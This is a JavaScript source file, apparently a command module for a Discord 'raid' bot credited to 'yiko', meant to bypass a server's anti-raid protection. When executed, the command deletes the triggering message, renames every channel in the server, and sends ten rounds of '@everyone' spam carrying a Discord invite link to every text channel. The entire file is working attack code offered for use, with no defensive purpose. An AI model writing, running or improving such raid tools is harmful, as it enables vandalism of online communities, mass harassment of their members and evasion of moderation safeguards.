const config = require("../config.json")
const axios = require("axios")

const chanelBypass = config.bypass_name
const spam = config.spamChannel

module.exports = {
  name: 'bypass',
  description: 'bypass anti raid server with your config!',
  async execute(message, args) {
    message.delete()

    process.title = `Bypass executed | Bot raid created by yiko`

    message.guild.channels.cache.forEach( channel => channel.setName(chanelBypass))
            
    const channels = message.guild.channels.cache.filter(channel => channel.type === 'text');

    if (channels.size === 0) {
      return message.channel.send('No hay canales de texto disponibles en el servidor.');
    }

    const sendMassMessagePromises = [];


    const sendMessageToAllChannels = async () => {
      for (let i = 0; i < 10; i++) {
        const promises = channels.map(async channel => {
          try {
            sendMassMessagePromises.push(channel.send(`@everyone discord.gg/idhontop **idh on top** | ${spam}`));
          } catch (error) {
            console.error(`Error al enviar mensaje al canal ${channel.name}: ${error}`);
          }
        });

        await Promise.all(promises);
        await Promise.all(sendMassMessagePromises)
      }
    };

   await sendMessageToAllChannels();

}}